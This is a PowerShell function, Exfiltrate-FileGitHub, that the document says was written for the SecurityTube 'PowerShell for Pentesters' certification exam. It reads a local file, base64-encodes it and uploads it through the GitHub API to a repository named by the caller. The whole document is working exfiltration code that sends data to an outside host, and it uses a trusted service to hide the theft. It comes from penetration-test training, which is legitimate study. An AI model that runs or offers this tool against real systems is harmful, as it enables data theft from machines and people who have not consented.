function Exfiltrate-FileGitHub { 
<#
.SYNOPSIS
A PowerShell script that exfiltrates a localfile to a Github repo

.DESCRIPTION
By using GitHub API 

.PARAMTER token
The github authentication token

.PARAMTER filename
The file to exfiltrate

.PARAMTER commitMessage
Optional commit message

.PARAMTER committerName
Optional author of the commit

.PARAMTER committerEmail
Optional email of the author of the commit

.PARAMTER GitHubAccountname
The GitHub accountname to use

.PARAMTER GitHubRepo
The name of the repo to use


.EXAMPLE

Exfiltrate-FileGitHub -filename file.txt -token  6xex74x48f9x021x8c99xa6xd77fxc451x2d2xb35 -GitHubAccountName myaccount -GitHubRepo myrepo
 

.LINK
https://developer.github.com/v3/repos/contents/
https://github.com/blog/1509-personal-api-tokens

Credit:
https://github.com/salu90/PSFPT/blob/master/Exfiltrate.ps1

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-6248
#>
     

           
    [CmdletBinding()] Param( 

       [Parameter(Mandatory = $true)]
       [String]
       $token,
       
       [Parameter(Mandatory = $true)]
       [String]
       $filename,

       [Parameter(Mandatory = $true)]
       [String]
       $GitHubAccountName,
              
       [Parameter(Mandatory = $true)]
       [String]
       $GitHubRepo,

       [Parameter(Mandatory = $false)]
       [String]
       $commitMessage = 'defaultCommit',

       [Parameter(Mandatory = $false)]
       [String]
       $committerName = 'defaultCommiter',

       [Parameter(Mandatory = $false)]
       [String]
       $committerEmail = 'defaultEmail@default.com'       
    )

    #gets the content of the file to exfiltrate and converts it to base64
    $fileContent = get-content $filename
    $fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
    $fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)

    #Sets github parameters for the exfiltration
    $accesstoken = $GitHubAccountName + ":" + $token
    $base64Token = [System.Convert]::ToBase64String([char[]]$accesstoken)
    $auth = @{Authorization = 'Basic {0}' -f $base64Token}
    $committer = @{"name"=$committerName; "email"=$committerEmail}
    $data = @{"path"=$fileName; "message"=$commitMessage; "committer"=$committer; "content"=$fileContentEncoded}
    $jsonData = ConvertTo-Json $data

    [Net.ServicePointManager]::SecurityProtocol = "tls12"

    $githubURI = "https://api.github.com/repos/" + $GitHubAccountName + "/" + $GitHubRepo + "/contents/" + $filename
    
    try {
    Invoke-RestMethod -Headers $auth  -Method PUT -Body $jsonData -Uri $githubURI -UseBasicParsing | Out-Null
    Write-Host ""
    Write-Host "The upload of $filename to the GitHub repo $GitHubAccountName/$GitHubRepo completed!" -ForegroundColor Green
    } catch {
    write-host "An error occurred." -ForegroundColor Red
 }

}
